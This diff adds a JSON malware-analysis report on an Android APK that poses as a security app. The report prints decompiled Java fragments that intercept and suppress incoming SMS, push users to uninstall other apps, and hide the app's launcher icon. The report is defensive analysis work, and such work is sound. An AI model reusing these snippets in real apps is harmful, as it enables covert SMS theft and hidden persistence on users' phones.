@@ -1,0 +1,134 @@
+{
+  "APK信息": {
+    "文件名": "d70340ffcbe391fe6c6c03bfe55eda327399dc2f4265bdf19b45cf68dc9b7bdf.apk",
+    "sha256": "d70340ffcbe391fe6c6c03bfe55eda327399dc2f4265bdf19b45cf68dc9b7bdf",
+    "包名": "com.super.antivirus.security",
+    "应用名": "Super Security",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 595.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\dr\\avl\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f289a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听 SMS_RECEIVED 广播，收到短信后立即调用 abortBroadcast() 终止广播继续传递，导致系统短信应用和其他应用无法收到该短信。随后从 intent 的 extras 中提取 pdus 数据并解析为 SmsMessage 对象，读取发送方地址等信息。这是一种典型的短信拦截行为，可隐藏验证码、银行通知等重要短信，常用于银行木马和短信欺诈。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.DELETE_PACKAGES"
+            ],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\anti\\security\\view\\NewInstallPopView;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopView.this.b.getPackageName()));\nintent.addFlags(268435456);\nNewInstallPopView.this.d.startActivity(intent);",
+          "malicious_code_snippet_context": "              public void onClick(View view) {\n                  NewInstallPopView.this.d();\n                  ((NotificationManager) NewInstallPopView.this.d.getSystemService(\"notification\")).cancel(NewInstallPopView.this.c);\n>>>                 Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopView.this.b.getPackageName()));\n>>>                 intent.addFlags(268435456);\n>>>                 NewInstallPopView.this.d.startActivity(intent);\n                  dab.b(aaz.a(Integer.valueOf(NewInstallPopView.this.c)), 0);\n              }\n          });",
+          "behavior_description": "该代码位于伪装为安全软件的恶意APK中，通过NewInstallPopView弹窗诱导用户点击按钮，点击后构造android.intent.action.DELETE意图，目标包名为弹窗中指定的应用包名，调起系统卸载界面诱导用户卸载其他应用（可能是合法安全软件），同时取消通知以掩盖痕迹。数据流向：弹窗交互(source)→startActivity(ACTION_DELETE)(sink)，虽非完全静默卸载，但属于社会工程学诱导卸载行为，是恶意软件清除安全防护的常见手法。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\csy;",
+          "method_signature": "if(componentName == null)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);",
+          "malicious_code_snippet_context": "              return false;\n          }\n          try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {\n              e2.printStackTrace();",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 动态启用或禁用指定组件。当传入参数 z 为 false 时，将组件状态设为 COMPONENT_ENABLED_STATE_DISABLED(值2)，即禁用该组件。恶意软件通常用此方法禁用主 Activity（带有 LAUNCHER intent filter 的组件），使应用图标从桌面消失，从而在用户不知情的情况下隐蔽驻留，防止用户发现并卸载。数据来源为方法参数 componentName（目标组件）和 z（启用/禁用标志）→ 危险操作为 setComponentEnabledSetting 系统API调用。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
